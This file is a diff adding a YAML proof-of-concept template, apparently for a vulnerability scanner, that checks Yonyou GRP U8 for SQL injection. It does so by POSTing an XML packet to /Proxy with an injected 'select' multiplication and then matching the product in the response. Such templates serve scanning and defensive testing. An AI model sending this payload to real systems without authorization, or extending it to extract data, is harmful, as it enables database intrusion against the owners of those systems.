@@ -1,0 +1,23 @@
+id: poc-yaml-yonyou-grp-u8-sqli
+info:
+  name: Yonyou Grp U8 SQL注入漏洞
+  severity: medium
+  tags:
+  - sql-injection
+  finger: Yonyou
+  reference: []
+  description: null
+variables:
+  r1: random_int(40000, 44800)
+  r2: random_int(40000, 44800)
+transport: http
+requests:
+- method: POST
+  path: /Proxy
+  headers: {}
+  data: cVer=9.8.0&dp=%3c?xml%20version%3d%221.0%22%20encoding%3d%22GB2312%22?%3e%3cR9PACKET%20version%3d%221%22%3e%3cDATAFORMAT%3eXML%3c%2fDATAFORMAT%3e%3cR9FUNCTION%3e%3cNAME%3eAS_DataRequest%3c%2fNAME%3e%3cPARAMS%3e%3cPARAM%3e%3cNAME%3eProviderName%3c%2fNAME%3e%3cDATA%20format%3d%22text%22%3eDataSetProviderData%3c%2fDATA%3e%3c%2fPARAM%3e%3cPARAM%3e%3cNAME%3eData%3c%2fNAME%3e%3cDATA%20format%3d%22text%22%3e%20select%20{{.r1}}%2a{{.r2}}%20%3c%2fDATA%3e%3c%2fPARAM%3e%3c%2fPARAMS%3e%3c%2fR9FUNCTION%3e%3c%2fR9PACKET%3e
+  redirect: false
+  raw: null
+  timeout: null
+  expression: status_code == 200 && contains(body, r1 * r2)
+  output: []
